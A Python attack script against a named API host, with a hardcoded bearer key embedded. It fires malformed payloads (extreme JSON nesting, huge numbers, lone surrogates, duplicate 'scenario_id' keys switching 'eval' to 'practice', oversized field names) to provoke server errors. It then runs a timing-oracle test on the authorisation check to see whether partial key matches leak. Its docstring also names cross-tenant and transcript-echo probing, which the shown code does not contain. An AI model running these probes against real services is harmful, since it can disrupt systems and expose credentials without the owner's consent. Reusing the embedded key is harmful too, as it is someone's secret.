#!/usr/bin/env python3
"""500-hunting + auth timing oracle + cross-tenant + transcript echo."""
import json, urllib.request, urllib.error, time, statistics

KEY = "rv8_lv8i3dIqtLkmIzF48B0Fu5RX"
BASE = "https://target-api.apps.01.cf.eu01.stackit.cloud/v1"

def raw_req(method, path, data, ctype, timeout=30):
    h = {"Authorization": f"Bearer {KEY}", "Content-Type": ctype}
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")[:250], time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:250], time.time() - t0

print("=== 500-hunting ===")
probes = []
probes.append(("deep-nesting-5k", (b'{"a":' * 5000) + b"1" + (b"}" * 5000), "application/json", "/sessions"))
probes.append(("huge-int", b'{"scenario_id":"practice","x":1e999}', "application/json", "/sessions"))
probes.append(("null-bytes", b'{"scenario_id":"practice"}', "application/json", "/sessions"))
probes.append(("lone-surrogate", '{"scenario_id":"practice\\ud800"}'.encode(), "application/json", "/sessions"))
probes.append(("dup-keys", b'{"scenario_id":"eval","scenario_id":"practice"}', "application/json", "/sessions"))
probes.append(("array-body", b'[1,2,3]', "application/json", "/sessions"))
probes.append(("string-body", b'"just a string"', "application/json", "/sessions"))
probes.append(("empty-json-body", b'', "application/json", "/sessions"))
probes.append(("bad-multipart", b'garbage-no-boundary', "multipart/form-data; boundary=xx", "/assets"))
probes.append(("xml-as-json", b'{"scenario_id":"practice"}', "text/xml", "/sessions"))
probes.append(("huge-field-name", json.dumps({"scenario_id": "practice", "A" * 100000: 1}).encode(), "application/json", "/sessions"))
for name, data, ctype, path in probes:
    code, body, dt = raw_req("POST", path, data, ctype)
    print(f"  [{code}] {name}: {body[:150]}")

print("\n=== auth timing oracle (401 latency: correct-prefix vs wrong key) ===")
def time_key(k, n=25):
    ts = []
    for _ in range(n):
        h = {"Authorization": f"Bearer {k}"}
        r = urllib.request.Request(BASE + "/scenarios", headers=h)
        t0 = time.time()
        try:
            urllib.request.urlopen(r, timeout=15)
        except urllib.error.HTTPError:
            pass
        ts.append(time.time() - t0)
        time.sleep(0.05)
    return ts
half = KEY[: len(KEY) // 2] + "X" * (len(KEY) - len(KEY) // 2)
wrong = "X" * len(KEY)
t_half = time_key(half)
t_wrong = time_key(wrong)
print(f"  correct-half: mean={statistics.mean(t_half)*1000:.0f}ms median={statistics.median(t_half)*1000:.0f}ms")
print(f"  all-wrong:    mean={statistics.mean(t_wrong)*1000:.0f}ms median={statistics.median(t_wrong)*1000:.0f}ms")
print("  (no significant diff expected if key compared hash-wise)")
